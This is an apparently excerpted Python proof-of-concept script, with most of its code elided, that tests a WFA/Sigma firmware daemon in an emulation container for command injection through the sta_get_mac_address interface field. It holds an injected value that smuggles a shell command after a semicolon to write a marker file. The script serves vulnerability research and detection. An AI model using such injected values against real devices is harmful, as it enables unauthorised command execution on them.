#!/usr/bin/env python3
"""
PoC: WFA/Sigma command injection through sta_get_mac_address interface field.

Default target is the rc.d emulation container IP/port used during analysis.
"""
...
def main():
    ...
    marker = "/tmp/wfa_inj_iface"
    docker_sh(args.container, firmware_root_expr() + f'rm -f "$root{marker}"')
    command = f"sta_get_mac_address,interface,ra0;echo WFA_IFACE>{marker};#"
    ...
    vulnerable = marker_value == "WFA_IFACE"
